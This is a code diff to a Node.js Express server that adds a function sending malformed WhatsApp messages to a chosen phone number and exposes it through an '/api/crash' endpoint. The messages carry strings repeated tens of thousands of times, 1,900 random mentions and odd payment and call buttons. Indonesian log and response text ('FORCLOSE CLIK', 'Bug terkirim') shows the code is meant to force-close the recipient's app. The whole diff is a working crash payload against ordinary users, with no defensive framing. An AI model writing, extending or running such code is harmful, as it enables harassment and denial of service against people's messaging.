@@ -40,7 +40,92 @@ app.post("/api/change-role", (req, res) => {
 });
 
 // TARO FUNCTIONMY
-
+async function VtxFcClick(target) {
+  await sock.relayMessage(target, {
+    groupInviteMessage: {
+      groupJid: "120363370626418572@g.us",
+      inviteCode: "X".repeat(95727),
+      inviteExpiration: "99999999999",
+      groupName: "../GyzenLyoraa៚" + "ោ៝".repeat(95727),
+      caption: "ោ៝".repeat(95727),
+      contextInfo: {
+      expiration: 1,
+        ephemeralSettingTimestamp: 1,
+        entryPointConversionSource: "WhatsApp.com",
+        entryPointConversionApp: "WhatsApp",
+        entryPointConversionDelaySeconds: 1,
+          disappearingMode: {
+            initiatorDeviceJid: target,
+            initiator: "INITIATED_BY_OTHER",
+            trigger: "UNKNOWN_GROUPS"
+          },
+          participant: "0@s.whatsapp.net",
+          remoteJid: "status@broadcast",
+          mentionedJid: "0@s.whatsapp.net",
+          questionMessage: {
+          paymentInviteMessage: {
+            serviceType: 1,
+            expiryTimestamp: null
+          }
+        },
+        externalAdReply: {
+          showAdAttribution: false,
+          sockderLargerThumbnail: true
+        }
+      },
+    },
+  }, { participant: { jid: target }, });
+  
+  await sock.relayMessage(target, {
+    viewOnceMessageV2: {
+      message: {
+        listResponseMessage: {
+          title: "../GyzenLyoraa៚",
+          listType: 4,
+          buttonText: { displayText: "🩸" },
+          sections: [],
+          singleSelectReply: {
+            selectedRowId: "⌜⌟"
+          },
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                { length: 1900 },
+                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            participant: "0@s.whatsapp.net",
+            remoteJid: "who know's ?",
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 1,
+                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
+              }
+            },
+            externalAdReply: {
+              title: "💧",
+              body: "🩸",
+              mediaType: 1,
+              sockderLargerThumbnail: false,
+              nativeFlowButtons: [
+                {
+                  name: "payment_info",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: "",
+                },
+              ],
+            },
+          },
+        },
+      },
+    },
+  }, { participant: { jid: target }, });
+  console.log(chalk.red(`FORCLOSE CLIK BY GYZEN SUKSES TERKIRIM`));
+      }
 //BATES FUNCTION 
 
 app.post("/api/crash", async (req, res) => {
@@ -50,7 +135,7 @@ app.post("/api/crash", async (req, res) => {
   }
 
   try {
-    await InvisibleHome(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
+    await VtxFcClick(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
     res.json({ success: true, message: `Bug terkirim ke ${target}` });
   } catch (err) {
     res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
